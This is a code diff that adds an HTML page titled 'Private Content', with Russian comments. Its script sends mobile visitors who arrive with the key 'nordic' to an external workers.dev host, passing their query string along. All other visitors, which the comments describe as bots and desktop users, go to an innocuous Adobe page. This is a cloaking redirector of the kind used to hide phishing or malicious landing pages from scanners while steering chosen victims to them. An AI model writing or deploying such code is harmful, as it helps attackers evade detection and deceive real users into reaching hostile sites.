@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Private Content</title>
+</head>
+<body>
+    <script>
+        // Твоя ссылка на Cloudflare Pages
+        const targetHost = "https://pagenord.radulive9.workers.dev/";
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const ua = navigator.userAgent;
+        const key = urlParams.get('sl');
+
+        // Если есть ключ 'nordic' и это мобилка — перекидываем
+        if (key === 'nordic' && /Android|iPhone|iPad/i.test(ua)) {
+            window.location.replace(targetHost + window.location.search);
+        } else {
+            // Ботов и десктоп кидаем на Adobe
+            window.location.replace("https://www.adobe.com/creativecloud/photography/type/nature-photography.html");
+        }
+    </script>
+</body>
+</html>
